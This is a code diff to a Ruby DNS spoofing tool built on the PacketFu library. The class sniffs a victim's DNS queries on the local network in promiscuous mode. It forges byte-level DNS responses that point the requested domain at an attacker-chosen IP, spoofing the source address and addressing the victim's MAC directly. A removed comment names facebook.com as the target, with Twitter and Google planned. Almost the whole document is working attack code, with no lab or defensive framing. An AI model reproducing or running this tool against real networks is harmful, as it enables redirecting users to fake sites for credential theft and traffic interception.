@@ -42,7 +42,8 @@ class DNSSpoof < Spoof
         @spoof_ip = spoof_ip
         @victim_ip = victim_ip
         @victim_mac = PacketFu::Utils.arp(victim_ip, :iface => iface)
-        @interface = iface
+        @iface = iface
+        @cfg = PacketFu::Utils.whoami?(:iface => iface)
         
         if spoof then
             start
@@ -74,7 +75,7 @@ class DNSSpoof < Spoof
         # Only capture DNS packets
         filter = "udp and port 53 and src " + @victim_ip
                 
-        cap = PacketFu::Capture.new(:iface => @interface, :start => true,
+        cap = PacketFu::Capture.new(:iface => @iface, :start => true,
                         :promisc => true, :filter => filter, :save => true)
                         
         puts "DNS Packet sniffing starting..."
@@ -98,7 +99,7 @@ class DNSSpoof < Spoof
                 
                 puts "Domain name: #{@domain_name}"
                 
-		send_response
+		        send_response
                 
             end # dnsquery == '10' then
         end # cap stream.each do |pkt|
@@ -141,47 +142,35 @@ class DNSSpoof < Spoof
     # Revisions: (Date and Description)
     #
     # Notes:
-    # Current websites being spoofed:
-    #   ~ www.facebook.com
-    #
-    # To be implemented:
-    #   ~ www.twitter.com
-    #   ~ www.google.ca
     #---------------------------------------------------------------------------
     def send_response
-        cfg = PacketFu::Utils.whoami?(:iface => @interface)
+	    # Create response packet
+        udp_packet = PacketFu::UDPPacket.new(:config => @cfg)
         
-	# Create response packet
-        udp_packet = PacketFu::UDPPacket.new(:config => cfg, 
-                                :udp_src => @packet.udp_dst, 
-                                :udp_dst => @packet.udp_src)
+        udp_packet.udp_src   = @packet.udp_dst
+        udp_packet.udp_dst   = @packet.udp_src
         udp_packet.eth_daddr = @victim_mac
-        udp_packet.ip_daddr = @victim_ip
-        udp_packet.ip_saddr = @packet.ip_daddr
-        udp_packet.payload = @packet.payload[0, 2]
+        udp_packet.ip_daddr  = @victim_ip
+        udp_packet.ip_saddr  = @packet.ip_daddr
+        udp_packet.payload   = @packet.payload[0, 2]
         
-        udp_packet.payload += "\x81" + "\x80" + "\x00" + "\x01" + "\x00" + "\x01"
-        udp_packet.payload += "\x00" + "\x00" + "\x00" + "\x00"
+        udp_packet.payload += "\x81\x80" + "\x00\x01" + "\x00\x01"
+        udp_packet.payload += "\x00\x00" + "\x00\x00"
         
         @domain_name.split('.').each do |part|
             udp_packet.payload += part.length.chr
             udp_packet.payload += part
         end # @domain_name.split('.').each do |part|
 
-        udp_packet.payload += "\x00" + "\x00" + "\x01" + "\x00" + "\x01"
-        udp_packet.payload += "\xc0" + "\x0c"
-        udp_packet.payload += "\x00" + "\x01" + "\x00" + "\x01"
-        # ttl
-        udp_packet.payload += "\x00" + "\x00" + "\x00" + "\x52"
-        # data length
-        udp_packet.payload += "\x00" + "\x04"
+        udp_packet.payload += "\x00\x00\x01\x00" + "\x01\xc0\x0c\x00"
+        udp_packet.payload += "\x01\x00\x01\x00" + "\x00\x1b\xf9\x00" + "\x04"
         
         # Address
         spoof_ip = @spoof_ip.split('.')
         udp_packet.payload += [spoof_ip[0].to_i, spoof_ip[1].to_i, spoof_ip[2].to_i, spoof_ip[3].to_i].pack('c*')
         
         udp_packet.recalc
-                
-	send(udp_packet, @interface)     
+         
+	    send(udp_packet, @iface)   
     end # send_response
 end
